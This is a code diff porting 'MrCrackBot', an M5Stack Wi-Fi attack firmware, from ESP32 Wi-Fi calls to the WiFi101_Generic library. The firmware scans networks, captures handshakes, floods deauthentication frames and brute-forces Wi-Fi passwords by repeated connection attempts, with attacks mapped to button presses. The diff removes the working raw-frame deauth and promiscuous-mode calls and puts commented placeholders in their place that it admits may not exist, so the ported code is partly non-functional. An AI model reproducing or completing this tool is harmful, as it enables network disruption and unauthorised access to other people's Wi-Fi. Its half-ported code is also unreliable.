@@ -1,5 +1,5 @@
 #include <M5Stack.h>
-#include <ESP_MultiWiFi.h>
+#include <WiFi101_Generic.h>
 #include <SdFat.h>
 #include <ArduinoJson.h>
 
@@ -83,7 +83,8 @@ void handleHandshakes() {
   File handshakeLog = SD.open("/handshake.log", FILE_WRITE);
   if (handshakeLog) {
     for (int i = 0; i < 10; ++i) {
-      esp_wifi_80211_tx(WIFI_IF_AP, (void *)deauthPacket, sizeof(deauthPacket), false);
+      // This line should send the deauth packet using WiFi101_Generic if raw packet sending is supported
+      // WiFi.sendPacket((uint8_t *)deauthPacket, sizeof(deauthPacket)); // Example function, may not exist
       delay(50);
     }
     handshakeLog.close();
@@ -132,21 +133,21 @@ String crackPassword(const String &ssid, const String &bssid) {
 bool tryPassword(const String &ssid, const String &bssid, const String &password) {
   Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());
 
-  ESP_MultiWiFi.disconnect();
+  WiFi.disconnect();
   delay(100);
-  ESP_MultiWiFi.begin(ssid.c_str(), password.c_str());
+  WiFi.begin(ssid.c_str(), password.c_str());
 
   unsigned long startTime = millis();
-  while (ESP_MultiWiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
+  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
     delay(200);
     Serial.print(".");
   }
   
-  bool isConnected = (ESP_MultiWiFi.status() == WL_CONNECTED);
+  bool isConnected = (WiFi.status() == WL_CONNECTED);
   
   if (isConnected) {
     Serial.println("Connected!");
-    ESP_MultiWiFi.disconnect();
+    WiFi.disconnect();
     return true;
   } else {
     Serial.println("Failed to connect.");
@@ -225,7 +226,80 @@ void saveNetworksToSD() {
 }
 
 void setupFirmware() {
-  // Additional firmware setup can be done here
+  // Initialize display
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
+  
+  // Display initial message
+  M5.Lcd.clear();
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.println("Initializing firmware...");
+  
+  // Initialize WiFi
+  if (WiFi.status() == WL_NO_SHIELD) {
+    M5.Lcd.println("WiFi shield not present");
+    while (true);
+  }
+
+  // Set Wi-Fi pins for M5Stack
+  WiFi.setPins(8, 7, 4, 2);
+
+  // Start Wi-Fi in AP mode for potential configuration
+  WiFi.beginAP("MrCrackBot", "password123");
+
+    // Display IP address for AP mode
+  IPAddress myIP = WiFi.localIP();
+  M5.Lcd.printf("AP IP address: %s\n", myIP.toString().c_str());
+
+  // Initialize SD card
+  if (!SD.begin()) {
+    M5.Lcd.println("SD Card initialization failed.");
+  } else {
+    M5.Lcd.println("SD Card initialized.");
+  }
+  
+  // Load networks from SD card
+  loadNetworksFromSD();
+  
+  // Display menu
+  displayMenu();
+  
+  // Set initial state
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
+  M5.Lcd.println("Firmware setup complete.");
+}
+
+void setup() {
+  M5.begin();
+  Serial.begin(115200);
+  
+  // Initialize WiFi
+  WiFi.init(&Serial);
+  
+  setupFirmware();
+}
+
+void loop() {
+  M5.update();
+  
+  if (M5.BtnA.wasPressed()) {
+    scanNetworks();
+  } else if (M5.BtnB.wasPressed()) {
+    selectNetwork();
+  } else if (M5.BtnC.wasPressed()) {
+    showNetworkInfo();
+  } else if (M5.BtnA.pressedFor(2000)) {
+    pwnNetwork();
+  } else if (M5.BtnB.pressedFor(2000)) {
+    crackNetworkPassword();
+  } else if (M5.BtnC.pressedFor(2000)) {
+    deauthNetwork();
+  }
+
+  if (M5.BtnA.pressedFor(5000)) {
+    enterDeepSleep();
+  }
 }
 
 void displayMenu() {
@@ -335,92 +409,21 @@ void enterDeepSleep() {
 }
 
 void setPromiscuousMode(bool enable) {
-  esp_wifi_set_promiscuous(enable);
-  if (enable) {
-    esp_wifi_set_channel(selectedNetwork.channel, WIFI_SECOND_CHAN_NONE);
-  }
+  // Implementation depends on the hardware and library support
+  // This may need custom implementation if supported
+  // For example: WiFi.promiscuousMode(enable);
 }
 
 void sendDeauthPackets(int count) {
   File deauthLog = SD.open("/deauth.log", FILE_WRITE);
   if (deauthLog) {
     for (int i = 0; i < count; ++i) {
-      esp_wifi_80211_tx(WIFI_IF_AP, (void *)deauthPacket, sizeof(deauthPacket), false);
+      // This line should send the deauth packet using WiFi101_Generic if raw packet sending is supported
+      // WiFi.sendPacket((uint8_t *)deauthPacket, sizeof(deauthPacket)); // Example function, may not exist
       delay(10);
     }
     deauthLog.close();
   } else {
     Serial.println("Failed to open deauth.log.");
-  }
-}
-
-void setupFirmware() {
-  // Initialize display
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
-  
-  // Display initial message
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.println("Initializing firmware...");
-  
-  // Set Wi-Fi mode
-  WiFi.mode(WIFI_STA);
-  
-  // Start Wi-Fi in AP mode for potential configuration
-  WiFi.softAP("MrCrackBot", "password123");
-  
-  // Display IP address for AP mode
-  IPAddress myIP = WiFi.softAPIP();
-  M5.Lcd.printf("AP IP address: %s\n", myIP.toString().c_str());
-  
-  // Set hostname
-  WiFi.setHostname("MrCrackBot");
-  
-  // Initialize SD card
-  if (!SD.begin()) {
-    M5.Lcd.println("SD Card initialization failed.");
-  } else {
-    M5.Lcd.println("SD Card initialized.");
-  }
-  
-  // Load networks from SD card
-  loadNetworksFromSD();
-  
-  // Display menu
-  displayMenu();
-  
-  // Set initial state
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Lcd.println("Firmware setup complete.");
-}
-
-void setup() {
-  M5.begin();
-  Serial.begin(115200);
-  ESP_MultiWiFi.init();
-  
-  setupFirmware();
-}
-
-void loop() {
-  M5.update();
-  if (M5.BtnA.wasPressed()) {
-    scanNetworks();
-  } else if (M5.BtnB.wasPressed()) {
-    selectNetwork();
-  } else if (M5.BtnC.wasPressed()) {
-    showNetworkInfo();
-  } else if (M5.BtnA.pressedFor(2000)) {
-    pwnNetwork();
-  } else if (M5.BtnB.pressedFor(2000)) {
-    crackNetworkPassword();
-  } else if (M5.BtnC.pressedFor(2000)) {
-    deauthNetwork();
-  }
-
-  if (M5.BtnA.pressedFor(5000)) {
-    enterDeepSleep();
   }
 }
